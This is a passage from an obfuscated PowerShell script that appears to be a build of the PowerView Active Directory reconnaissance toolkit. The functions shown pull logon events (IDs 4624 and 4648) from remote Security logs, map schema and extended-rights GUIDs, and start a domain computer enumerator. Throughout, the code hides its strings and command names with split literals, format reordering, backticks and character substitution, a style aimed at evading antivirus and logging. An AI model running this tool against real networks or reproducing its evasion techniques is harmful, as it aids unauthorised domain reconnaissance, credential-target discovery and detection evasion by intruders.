 ')."rE`PlAce"(([Char]68+[Char]84+[Char]109),[StriNG][Char]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d '+'(Lev'+'el='+'4 '+'or'+' '+'L'+'eve'+'l'+'=0) '+'and'+' '+'('+'EventI'+'D=462'+'4'+')
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+' '+'TimeC'+'reat'+'ed'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@Sy'+'st'+'em'+'Time&gt;={1'+'}{0}('+'{0}StartTi'+'m'+'e.ToU'+'n'+'iversalTime().ToS'+'trin'+'g({1}s{1})){1} ') -f [char]36,[char]39+'an'+'d '+('@SystemT'+'i'+'me&lt;'+'={0'+'}{1'+'}({1}End'+'Time.ToUnive'+'r'+'sa'+'lT'+'im'+'e'+'('+')'+'.'+'To'+'S'+'tring({0'+'}s{0})){0}
 ') -f [ChAr]39,[ChAr]36+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('*['+'EventData[D'+'ata[@Name={0}T'+'argetUse'+'r'+'Name{0}]'+' ')  -F  [ChaR]39+'!'+'= '+('{0}ANO'+'NY'+'MO'+'US ')-F[CHAr]39+(('LOGONl'+'2'+'M]]
 ') -RePLACe  ([ChAR]108+[ChAR]50+[ChAR]77),[ChAR]39)+' '+' '+' '+' '+' '+' '+' '+'</'+'Sel'+'ect'+'>

 '+' '+' '+' '+' '+' '+' '+' '+'<!-'+'- '+'Logo'+'n '+'with'+' '+'explic'+'i'+'t '+'cre'+'den'+'tial'+' '+'e'+'vents '+'-->'+'
 '+' '+' '+' '+' '+' '+' '+' '+'<Sele'+'ct '+('Pat'+'h=LHuSe'+'c'+'urity'+'LHu>'+'
'+' ')."REpL`ACE"(([CHAR]76+[CHAR]72+[CHAR]117),[STriNG][CHAR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'System'+'[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Prov'+'ide'+'r[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@N'+'ame'+'={'+'0'+'}Mi'+'cr'+'osoft-W'+'in'+'dows'+'-'+'S'+'ecurity-Auditing'+'{0}
'+' ')-F [ChAR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+' '+'('+'Lev'+'el'+'=4 '+'o'+'r '+'Leve'+'l=0) '+'an'+'d '+'('+'EventID='+'4648)
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'nd '+'T'+'im'+'eCreated'+'['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@Syst'+'emTime&gt;'+'=4rBN'+'wZ(NwZ'+'StartTime.ToUn'+'iversa'+'lTi'+'me('+')'+'.ToStr'+'ing('+'4r'+'B'+'s'+'4'+'rB))'+'4rB ')."ReP`LaCe"('4rB',[stRINg][cHaR]39).("{2}{1}{0}" -f'LacE','P','RE').Invoke('NwZ','$')+'an'+'d '+('@Syst'+'e'+'m'+'Time&'+'l'+'t;=nNJ'+'W0M(W0MEndTime.ToUniver'+'salTi'+'me'+'()'+'.'+'To'+'Strin'+'g(nNJsnN'+'J))nNJ
 ')."re`PlACe"(([chaR]87+[chaR]48+[chaR]77),'$')."r`e`Place"(([chaR]110+[chaR]78+[chaR]74),[StrIng][chaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+'</S'+'elect>'+'
'+'
 '+' '+' '+' '+' '+' '+' '+' '+'<Supp'+'res'+'s'+' '+('Path={'+'0}S'+'e'+'curi'+'ty{0}>
 ')-f [Char]34+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Sys'+'tem['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Pro'+'vide'+'r[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@Na'+'me={0}M'+'icr'+'osoft-Wind'+'ow'+'s-Secu'+'ri'+'ty'+'-'+'Auditi'+'n'+'g'+'{0}'+'
 ')-F [CHAR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'('+'Lev'+'el=4 '+'o'+'r '+'Level'+'=0)'+' '+'and'+' '+'('+'Eve'+'ntID'+'=462'+'4 '+'o'+'r '+'Event'+'ID='+'4625 '+'o'+'r '+'Eve'+'ntID=463'+'4)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'nd
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EventData'+'[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'(
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('('+'Data[@Name'+'=fmB'+'L'+'ogo'+'nT'+'y'+'pefmB]=f'+'mB'+'5fmB ')."R`EPLaCE"('fmB',[strING][ChAR]39)+'or'+' '+(('Da'+'t'+'a['+'@N'+'ame=3rOLogonType3r'+'O'+']=3rO0'+'3r'+'O)
 ') -crePLACE([cHAR]51+[cHAR]114+[cHAR]79),[cHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'or'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('D'+'ata['+'@'+'Name=A'+'y7Tar'+'getUserNam'+'eA'+'y7]'+'='+'Ay7AN'+'O'+'NYMOUS ')."REPLa`ce"('Ay7',[StrINg][ChAr]39)+('LOG'+'ONHyK'+'
 ')."rE`plACE"(([ChAR]72+[ChAR]121+[ChAR]75),[string][ChAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o'+'r
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('Data[@'+'Na'+'me'+'=39'+'ET'+'arget'+'Use'+'rSID3'+'9'+'E]='+'39'+'ES'+'-1-'+'5-18'+'39E
 ') -crEpLACE '39E',[char]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+')'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+'<'+'/Su'+'p'+'pr'+'ess>
 '+' '+' '+' '+(('<'+'/Query>
<'+'/Qu'+'eryL'+'i'+'st>'+'
2pn')-CreplAcE  '2pn',[CHAR]34))
        ${eVE`N`TarGume`NTS} = @{
            ("{2}{0}{1}" -f'Pat','h','FilterX') = ${xPA`T`hFIL`TER}
            ("{2}{1}{0}"-f 'ame','gN','Lo') = ("{2}{0}{1}"-f'ecurit','y','S')
            ("{2}{0}{1}"-f 'Event','s','Max') = ${m`Axeven`TS}
        }
        if (${p`SBOun`dPaRAM`EtE`RS}[("{3}{2}{1}{0}" -f'l','ia','redent','C')]) { ${E`VENt`ARGuMe`NTS}[("{1}{2}{0}"-f 'al','Credent','i')] = ${C`REDeNTI`AL} }
    }

    PROCESS {
        ForEach (${coMP`UT`ER} in ${Co`Mp`UT`eRName}) {

            ${EVE`N`TaRGumEN`TS}[("{1}{2}{0}" -f'ame','Compute','rN')] = ${CoMP`Ut`ER}

            &("{2}{1}{0}"-f 'nt','Eve','Get-Win') @EventArguments| &("{1}{0}{2}" -f'a','ForE','ch-Object') {
                ${EVe`Nt} = ${_}
                ${P`RopeR`TIes} = ${E`V`eNT}."PrOpeR`Ti`ES"
                Switch (${Eve`NT}."I`d") {
                    
                    4624 {
                        
                        if(-not ${proPE`R`T`Ies}[5]."vAl`UE".("{2}{1}{0}" -f'sWith','d','En').Invoke('$')) {
                            ${OU`Tput} = &("{2}{0}{1}"-f'b','ject','New-O') ("{2}{0}{1}" -f'b','ject','PSO') -Property @{
                                ("{1}{3}{0}{2}"-f'r','Comp','Name','ute')              = ${CO`Mpu`Ter}
                                ("{0}{1}{2}"-f'TimeCr','ea','ted')               = ${EVe`NT}."Ti`MEcr`e`AteD"
                                ("{0}{1}" -f'Event','Id')                   = ${e`VENT}."ID"
                                ("{0}{1}{2}{3}" -f 'S','ubj','e','ctUserSid')            = ${pR`O`perties}[0]."V`AlUE".("{0}{1}{2}" -f'ToSt','ri','ng').Invoke()
                                ("{4}{3}{1}{2}{0}"-f 'me','jectUse','rNa','ub','S')           = ${P`RoPErT`ieS}[1]."VA`LuE"
                                ("{3}{4}{2}{1}{0}" -f'e','omainNam','tD','Su','bjec')         = ${P`Ro`pe`RTIes}[2]."V`ALUe"
                                ("{2}{0}{3}{1}" -f'bjec','d','Su','tLogonI')            = ${pro`p`ERTI`ES}[3]."vA`lUE"
                                ("{2}{1}{3}{0}{4}" -f 'ser','r','Ta','getU','Sid')             = ${pRope`R`Ties}[4]."v`ALUE".("{0}{1}{2}" -f 'T','o','String').Invoke()
                                ("{0}{2}{3}{1}"-f'T','me','arget','UserNa')            = ${Prop`E`RTIes}[5]."V`AlUe"
                                ("{3}{4}{5}{1}{0}{2}"-f 'inNam','ma','e','Ta','rgetD','o')          = ${Pro`peRt`i`Es}[6]."VA`lUE"
                                ("{0}{1}{3}{4}{2}" -f 'Target','L','d','og','onI')             = ${proPe`RT`ies}[7]."v`AlUE"
                                ("{0}{1}{2}" -f 'Lo','gonTy','pe')                 = ${pROPe`Rt`I`Es}[8]."vA`Lue"
                                ("{4}{2}{0}{3}{1}"-f'cess','e','ogonPro','Nam','L')          = ${PRo`pE`R`TiES}[9]."val`UE"
                                ("{5}{4}{3}{0}{1}{2}" -f 'kag','e','Name','onPac','cati','Authenti') = ${PR`OpeRTI`eS}[10]."Val`Ue"
                                ("{0}{1}{3}{2}" -f 'Workst','ati','nName','o')           = ${P`ROpe`RT`IES}[11]."v`Alue"
                                ("{2}{0}{1}"-f'nGu','id','Logo')                 = ${p`ROper`TIEs}[12]."Val`UE"
                                ("{2}{3}{1}{0}"-f'Services','d','Tra','nsmitte')       = ${proP`E`R`TIEs}[13]."v`AluE"
                                ("{0}{3}{1}{2}"-f 'LmPa','a','geName','ck')             = ${pr`opE`RTi`ES}[14]."Va`lUe"
                                ("{2}{1}{0}" -f'gth','en','KeyL')                 = ${p`RoPeR`T`ieS}[15]."vaL`Ue"
                                ("{1}{0}{3}{2}"-f'oce','Pr','Id','ss')                 = ${pR`Op`ER`TIES}[16]."vAL`UE"
                                ("{3}{2}{1}{0}"-f 'ssName','e','oc','Pr')               = ${PrOpE`R`T`Ies}[17]."va`luE"
                                ("{1}{0}"-f'pAddress','I')                 = ${PRo`pER`TiEs}[18]."va`LuE"
                                ("{0}{1}" -f'Ip','Port')                    = ${Proper`TI`es}[19]."vAL`Ue"
                                ("{2}{3}{0}{1}" -f'nationLe','vel','Impers','o')        = ${p`ROpE`R`TIes}[20]."v`ALue"
                                ("{5}{3}{2}{0}{4}{1}" -f 'd','minMode','tricte','s','Ad','Re')       = ${P`RoperT`iEs}[21]."v`AluE"
                                ("{1}{3}{2}{0}{4}" -f'dUs','Target','un','Outbo','erName')    = ${PROP`eRt`ieS}[22]."V`ALuE"
                                ("{2}{0}{3}{1}{6}{5}{4}" -f 'ar','dD','T','getOutboun','e','ainNam','om')  = ${P`RopERTI`ES}[23]."val`UE"
                                ("{0}{1}{2}{3}"-f'Virtu','al','A','ccount')            = ${p`RO`Pert`Ies}[24]."va`Lue"
                                ("{5}{3}{4}{2}{1}{0}"-f'd','gonI','dLo','etL','inke','Targ')       = ${pro`peRt`I`Es}[25]."vA`luE"
                                ("{2}{1}{0}" -f'edToken','levat','E')             = ${Prop`Ert`IeS}[26]."v`AlUe"
                            }
                            ${o`U`TPUT}."psO`B`jeCT"."Typ`enAM`Es".("{1}{0}{2}"-f 'nse','I','rt').Invoke(0, ("{1}{4}{0}{2}{3}{5}"-f '.','P','L','ogon','owerView','Event'))
                            ${ouT`p`UT}
                        }
                    }

                    
                    4648 {
                        
                        if((-not ${P`RO`pErt`ies}[5]."vAl`UE".("{1}{2}{0}"-f 'h','Ends','Wit').Invoke('$')) -and (${p`R`opEr`TIes}[11]."VA`LUe" -match ((("{3}{2}{1}{0}"-f 'exe','Q5M.','st','taskho')) -cRepLaCe  ([chaR]81+[chaR]53+[chaR]77),[chaR]92))) {
                            ${Ou`T`PUT} = &("{2}{1}{0}" -f 'ct','bje','New-O') ("{2}{0}{1}"-f'b','ject','PSO') -Property @{
                                ("{2}{3}{0}{1}"-f 'Nam','e','C','omputer')              = ${Co`MPut`ER}
                                ("{1}{3}{2}{0}"-f'eated','T','meCr','i')       = ${evE`Nt}."Time`CRE`A`TED"
                                ("{1}{2}{0}"-f 'Id','Ev','ent')           = ${e`VEnT}."Id"
                                ("{3}{2}{0}{1}" -f 'User','Sid','bject','Su')    = ${p`R`oPErti`ES}[0]."vaL`UE".("{2}{0}{1}"-f'o','String','T').Invoke()
                                ("{4}{3}{2}{1}{0}" -f'ame','N','r','se','SubjectU')   = ${pR`O`PERtieS}[1]."vAl`UE"
                                ("{2}{1}{0}{3}"-f 'ainN','bjectDom','Su','ame') = ${prOPEr`T`iEs}[2]."VaL`UE"
                                ("{0}{2}{1}{3}{4}" -f 'Sub','og','jectL','o','nId')    = ${ProPE`R`TI`ES}[3]."V`AlUE"
                                ("{0}{2}{3}{1}"-f'Logo','d','nGu','i')         = ${prOPeR`T`ies}[4]."V`AluE".("{1}{0}{2}"-f 'trin','ToS','g').Invoke()
                                ("{1}{2}{0}" -f 'Name','TargetUse','r')    = ${prO`Pe`RtIES}[5]."V`ALuE"
                                ("{2}{3}{0}{1}" -f 'nNam','e','Tar','getDomai')  = ${PRo`PErtI`es}[6]."V`ALuE"
                                ("{1}{2}{0}{3}" -f'go','T','argetLo','nGuid')   = ${pR`oPER`T`IeS}[7]."va`LuE"
                                ("{2}{3}{1}{0}"-f 'erverName','etS','Tar','g')  = ${P`ROpe`RTIes}[8]."VA`LUE"
                                ("{0}{3}{2}{1}"-f'T','fo','tIn','arge')        = ${PR`o`PeRtieS}[9]."val`UE"
                                ("{1}{2}{0}"-f 'sId','Pro','ces')         = ${proP`E`RTiEs}[10]."Va`LuE"
                                ("{2}{1}{0}" -f'e','rocessNam','P')       = ${PRO`p`ERTIeS}[11]."va`luE"
                                ("{1}{0}"-f'pAddress','I')         = ${p`ROPert`I`eS}[12]."va`lUe"
                                ("{0}{2}{1}"-f 'Ip','t','Por')            = ${pROPe`R`TiES}[13]."v`ALUE"
                            }
                            ${oUTP`Ut}."Ps`oBj`ect"."TyPEn`AM`eS".("{1}{0}"-f'rt','Inse').Invoke(0, ("{10}{1}{0}{3}{2}{6}{4}{8}{9}{7}{5}" -f'View.','r','li','Exp','itCre','t','c','lLogonEven','d','entia','Powe'))
                            ${ou`Tp`Ut}
                        }
                    }
                    ("{1}{0}{2}"-f'fau','de','lt') {
                        &("{0}{1}{2}"-f'Write-War','ni','ng') "No handler exists for event ID: $($Event.Id) "
                    }
                }
            }
        }
    }
}


function gET-`d`omAINg`UIdM`Ap {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{4}{3}{2}{0}" -f 'Process','PSSho','d','l','u'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oMAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{2}{0}{3}{1}"-f'o','r','r','lle','DomainCont'})]
        [String]
        ${SE`R`VER},

        [ValidateRange(1, 10000)]
        [Int]
        ${r`Es`UL`TPAg`esize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`E`RverTimElI`MIT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`D`entI`Al} =  ${5R0vk}::"emp`Ty"
    )

    ${Gu`IdS} = @{("{3}{6}{4}{8}{5}{2}{7}{1}{0}"-f'00','000','-0','0','00-','0','0000000-00','000-0000000','000') = 'All'}

    ${fOrEstar`Gu`M`EntS} = @{}
    if (${P`sbound`P`ARAm`E`Ters}[("{0}{1}{2}" -f 'Credent','ia','l')]) { ${FOR`eStaRg`UME`NTs}[("{2}{3}{0}{1}"-f 'i','al','Cr','edent')] = ${CReDe`Nt`IAL} }

    try {
        ${Sch`EMaP`ATH} = (&("{0}{1}{2}" -f'Get-For','es','t') @ForestArguments)."SCh`EmA"."n`AMe"
    }
    catch {
        throw ("{11}{6}{10}{9}{2}{5}{0}{8}{4}{3}{1}{7}"-f'g forest ',' ','Map] Error in retr','m','ro','ievin','DomainG','Get-Forest','schema path f','D','UI','[Get-')
    }
    if (-not ${S`ChEmA`PaTH}) {
        throw ("{12}{14}{4}{8}{15}{0}{16}{3}{10}{18}{2}{11}{13}{19}{7}{9}{5}{17}{6}{1}" -f 'ret','st','res','ievi','UIDMa','e','e','f','p] Er','rom G','ng','t schema pat','[Get-Doma','h','inG','ror in ','r','t-For',' fo',' ')
    }

    ${SE`ARChE`RArguM`entS} = @{
        ("{0}{1}{2}" -f'S','earchBa','se') = ${SC`HEmA`pa`Th}
        ("{1}{2}{0}" -f 'er','LD','APFilt') = ("{2}{4}{0}{5}{1}{3}" -f 'GUID','*','(sch',')','emaID','=')
    }
    if (${Ps`BOuN`d`paRAMEt`eRS}[("{0}{1}{2}" -f 'D','o','main')]) { ${se`ARchEra`R`gUm`e`NtS}[("{1}{0}"-f 'ain','Dom')] = ${DOM`AIN} }
    if (${PSbo`UN`dparAM`Ete`RS}[("{0}{1}{2}" -f 'S','erve','r')]) { ${S`EaRCH`Erargu`MEnts}[("{2}{1}{0}"-f'er','rv','Se')] = ${SeRV`ER} }
    if (${P`S`BO`U`NDP`ArAMEtERs}[("{1}{3}{0}{2}" -f 'tPa','Res','geSize','ul')]) { ${s`EaRc`HeRARG`Um`EntS}[("{2}{3}{0}{1}"-f 'lt','PageSize','Re','su')] = ${RE`s`UL`TPageS`ize} }
    if (${P`S`BounDp`A`RAMEtE`Rs}[("{0}{1}{2}" -f 'ServerTim','eLi','mit')]) { ${S`e`ArCheRargUMEn`TS}[("{2}{0}{3}{1}"-f'erTime','it','Serv','Lim')] = ${serV`ERT`I`M`elIMiT} }
    if (${PSBOuN`Dp`ARaMEte`Rs}[("{2}{1}{0}" -f 'ntial','de','Cre')]) { ${sEARChERar`gU`mEN`Ts}[("{2}{0}{1}" -f 'dentia','l','Cre')] = ${C`REDe`NTIal} }
    ${S`che`mAse`ARc`heR} = &("{3}{0}{2}{1}"-f't-DomainSe','rcher','a','Ge') @SearcherArguments

    if (${S`C`he`MaseARCher}) {
        try {
            ${r`ESuLts} = ${sc`HeM`AsE`ArC`HEr}.("{1}{0}" -f 'All','Find').Invoke()
            ${ReS`U`Lts} | &("{2}{1}{3}{0}"-f 'ct','here-Obj','W','e') {${_}} | &("{2}{3}{0}{1}"-f 'ec','t','ForEa','ch-Obj') {
                ${G`UiDs}[(&("{1}{2}{0}" -f 't','New-Obje','c') ("{0}{1}"-f'Gui','d') (,${_}."P`R`Ope`RtIEs"."SC`h`emA`IdgUiD"[0]))."gu`ID"] = ${_}."p`RopE`Rt`IES"."NA`mE"[0]
            }
            if (${reSU`L`TS}) {
                try { ${ResU`LTs}.("{0}{2}{1}"-f'dis','se','po').Invoke() }
                catch {
                    &("{1}{0}{2}{3}"-f 'e-Ve','Writ','rbos','e') ('[Get-Doma'+'inGUI'+'D'+'Map]'+' '+'E'+'rror '+'disp'+'o'+'sing '+'of'+' '+'th'+'e '+'Res'+'ults'+' '+'objec'+'t: '+"$_")
                }
            }
            ${sC`H`e`Mas`eArCHER}.("{0}{1}"-f 'disp','ose').Invoke()
        }
        catch {
            &("{0}{3}{1}{2}"-f'Writ','V','erbose','e-') ('['+'Get-Do'+'main'+'GU'+'I'+'DMap'+'] '+'Error'+' '+'i'+'n '+'bui'+'lding'+' '+'GU'+'ID '+'map:'+' '+"$_")
        }
    }

    ${SeA`Rch`Era`RGUMEn`TS}[("{2}{1}{0}"-f 'ase','earchB','S')] = ${scHe`map`ATh}.("{2}{1}{0}"-f'ce','epla','r').Invoke(("{0}{1}" -f 'S','chema'),("{1}{2}{3}{0}" -f'ights','E','xtended-','R'))
    ${SEArC`h`ErAR`G`U`MENts}[("{0}{2}{1}"-f 'LD','r','APFilte')] = (("{8}{3}{0}{4}{9}{6}{5}{7}{2}{1}"-f 'bjectClass=co','t)','gh','o','n','R','lAccess','i','(','tro'))
    ${r`I`GHtS`S`EARChEr} = &("{4}{0}{1}{2}{3}{5}" -f 'et-','D','omainSe','arche','G','r') @SearcherArguments

    if (${RiGh`TSs`e`ARcHer}) {
        try {
            ${Re`sUL`Ts} = ${Rig`HTsseA`RCH`er}.("{2}{0}{1}" -f 'i','ndAll','F').Invoke()
            ${Re`SuL`TS} | &("{2}{0}{1}" -f'jec','t','Where-Ob') {${_}} | &("{3}{2}{4}{0}{1}" -f'ch-O','bject','o','F','rEa') {
                ${GU`IDs}[${_}."PrO`Per`Ti`ES"."riG`H`TSgUid"[0].("{2}{1}{0}" -f'ring','oSt','t').Invoke()] = ${_}."p`R`OPertiES"."nA`mE"[0]
            }
            if (${Re`SulTs}) {
                try { ${resuL`Ts}.("{0}{2}{1}"-f 'd','spose','i').Invoke() }
                catch {
                    &("{0}{1}{2}" -f 'Write','-Verb','ose') ('[G'+'et-D'+'oma'+'inGUID'+'M'+'ap'+'] '+'E'+'rror '+'d'+'is'+'posing '+'o'+'f '+'t'+'he '+'Resu'+'lts'+' '+'o'+'bject'+': '+"$_")
                }
            }
            ${ri`g`h`TSSeAr`CheR}.("{2}{1}{0}" -f'pose','is','d').Invoke()
        }
        catch {
            &("{0}{1}{2}" -f 'Writ','e-','Verbose') ('['+'Get'+'-Dom'+'ainGUIDMap'+'] '+'Erro'+'r '+'i'+'n '+'b'+'uilding'+' '+'G'+'UID '+'m'+'ap: '+"$_")
        }
    }

    ${gU`i`ds}
}


function GeT-`Do`m`Ai`NcomPuter {


    [OutputType({"{2}{1}{0}{3}" -f'View.Compute','wer','Po','r'})]
    [OutputType({"{1}{4}{2}{0}{5}{3}" -f 'w','P','ie','er.Raw','owerV','.Comput'})]
    [CmdletBinding()]
    Param (
        [Parameter(poSiTion = 0, VaLUEfroMPiPEliNE = ${tr`UE}, vALuefroMpipelIneBYpropErTYnAme = ${tr`Ue})]
        [Alias({"{3}{1}{2}{0}" -f'e','AccountN','am','Sam'}, {"{1}{0}"-f 'ame','N'}, {"{0}{1}{2}{3}" -f'D','NSHo','st','Name'})]
        [String[]]
        ${Iden`TItY},

        [Switch]
        ${UnCo`Nst`RAi`N`eD},

        [Switch]
        ${T`R`USt`e`dtOAUTH},

        [Switch]
        ${prIn`TerS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{2}{5}{3}{1}{0}"-f 'me','alNa','rinc','p','ServiceP','i'})]
        [String]
        ${s`Pn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${o`P`erAT`iNgSYs`TEm},

        [ValidateNotNullOrEmpty()]
        [String]
        ${S`ervic`e`Pack},

        [ValidateNotNullOrEmpty()]
        [String]
        ${SiT`eN`AmE},

        [Switch]
        ${p`inG},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOM`A`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f'lte','r','Fi'})]
        [String]
        ${lDapF`iLt`eR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRoP`ErT`IeS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'h','ADSPat'})]
        [String]
        ${sEarC`HB`ASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}{3}" -f 'olle','DomainC','ontr','r'})]
        [String]
        ${SE`R`VEr},

        [ValidateSet({"{0}{1}"-f 'Bas','e'}, {"{2}{0}{1}" -f 'neLeve','l','O'}, {"{1}{0}{2}"-f'r','Subt','ee'})]
        [String]
        ${sea`RcHSco`pe} = ("{2}{0}{1}" -f 'tr','ee','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rESUlTp`AGe`s`Ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERvERt`ImElI`M`It},

        [ValidateSet({"{1}{0}"-f 'l','Dac'}, {"{0}{1}"-f 'Gr','oup'}, {"{0}{1}"-f 'Non','e'}, {"{0}{1}" -f 'Ow','ner'}, {"{1}{0}"-f 'cl','Sa'})]
        [String]
        ${SEc`URit`Ym`ASkS},

        [Switch]
        ${T`OmbsT`OnE},

        [Alias({"{3}{2}{1}{0}" -f'rnOne','u','et','R'})]
        [Switch]
        ${Fi`N`DONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crE`dE`NTi`Al} =   ${5R0`Vk}::"E`mpTy",

        [Switch]
        ${R`Aw}
    )

    DynamicParam {
        ${U`Ac`VaLuE`N`AMes} =   (  &("{1}{0}" -f 'abLE','VAri') ("0B"+"z") -vAlueON  )::("{2}{0}{1}"-f 'N','ames','Get').Invoke(${U`AceN`Um})
        
        ${U`ACvalu`enA`M`Es} = ${UA`CVALu`e`Na`MEs} | &("{0}{1}{2}{3}"-f'For','Each','-Objec','t') {${_}; "NOT_$_"}
        
        &("{0}{3}{1}{4}{5}{2}" -f'Ne','-Dyn','r','w','am','icParamete') -Name ("{2}{1}{0}"-f'r','te','UACFil') -ValidateSet ${uaC`VAL`UenaMeS} -Type ([array])
    }

    BEGIN {
        ${SeaRchEra`R`G`Umen`TS} = @{}
        if (${PSB`O`UNDpARAMet`eRS}[("{1}{0}{2}"-f 'i','Doma','n')]) { ${sE`Ar`cHE`RaR`guMEnts}[("{1}{0}{2}"-f 'a','Dom','in')] = ${do`m`AIN} }
        if (${Psb`Ou`NdPaR`AMeTErs}[("{0}{1}{2}"-f'P','rope','rties')]) { ${SEA`RchER`Ar`g`UMeNTs}[("{0}{1}{2}" -f'Prope','rtie','s')] = ${propeR`T`IES} }
        if (${PsB`oUn`DparaMEtE`RS}[("{0}{2}{3}{1}"-f 'Se','Base','a','rch')]) { ${SeaR`C`hErArgume`N`Ts}[("{0}{1}{2}"-f 'Se','archBas','e')] = ${sEarC`H`BASe} }
        if (${PSbO`U`NDPAR`AMeTE`Rs}[("{0}{1}"-f'Se','rver')]) { ${SE`ArChe`RaRgu`mEN`Ts}[("{0}{1}{2}"-f 'Se','rv','er')] = ${Ser`V`ER} }
        if (${PsbouND`ParA`m`EtErS}[("{0}{2}{1}"-f'Searc','ope','hSc')]) { ${sEAr`cHe`RA`R`g`UMentS}[("{0}{3}{1}{2}"-f 'Se','hS','cope','arc')] = ${sEa`R`Chsc`OpE} }
        if (${PSBo`U`Nd`p`ARa`METerS}[("{1}{0}{2}{3}"-f 'es','R','ultPa','geSize')]) { ${SeA`RCh`E`RARgUmen`TS}[("{2}{1}{0}{3}" -f 'iz','tPageS','Resul','e')] = ${Res`U`Lt`pAG`eSIzE} }
